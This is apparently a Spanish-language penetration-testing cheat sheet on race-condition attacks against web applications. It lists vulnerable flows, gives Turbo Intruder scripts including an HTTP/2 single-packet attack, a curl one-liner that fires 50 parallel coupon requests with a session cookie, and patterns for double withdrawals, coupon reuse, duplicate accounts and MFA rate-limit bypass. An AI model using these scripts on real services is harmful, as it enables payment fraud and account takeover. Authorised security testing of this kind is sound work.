# Race Conditions

## Cuándo hay riesgo

Cualquier flujo que asuma "una sola ejecución" sin lock atómico:
- Aplicar cupón
- Withdraw / transfer / payment
- Solicitar password reset
- Crear cuenta con email único
- Aceptar invitación
- Aplicar refund
- Subir/aprobar contenido
- Brute MFA (TOCTOU del intento)

## Turbo Intruder (extensión Burp, gold standard)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

Single-packet attack (HTTP/2):
```python
engine = RequestEngine(endpoint=target.endpoint,
                       concurrentConnections=1,
                       engine=Engine.BURP2)
for i in range(20):
    engine.queue(target.req, gate='race1')
engine.openGate('race1')
```

## race-the-web

```bash
race-the-web config.toml
```

## Curl burst (rápido, baja precisión)

```bash
seq 50 | xargs -P 50 -I{} curl -s -X POST https://target.cl/coupon -d "code=PROMO20" -H "Cookie: session=abc"
```

## Patrones

### TOCTOU clásico
```
1. Check balance: 100
2. Check balance: 100  (otra request paralela)
3. Withdraw 100        → balance: 0
4. Withdraw 100        → balance: -100  (no validó de nuevo)
```

### Coupon abuse
```
N requests paralelas aplicando el mismo coupon → aplicado N veces.
```

### Email uniqueness bypass
```
Crear N cuentas con mismo email en paralelo → N cuentas duplicadas.
```

### MFA brute
```
Mismo código TOTP probado en N requests → bypass del rate-limit que cuenta secuencialmente.
```

## Anti-patrones

- ❌ Probar con 2-3 requests "cuasi simultáneas" desde curl en bash → no es race real, latencia desigual.
- ❌ No usar HTTP/2 single-packet cuando el server lo soporta — la única manera fiable de hits sub-ms.
- ❌ No verificar idempotencia primero (algunos endpoints son seguros por diseño con `Idempotency-Key`).
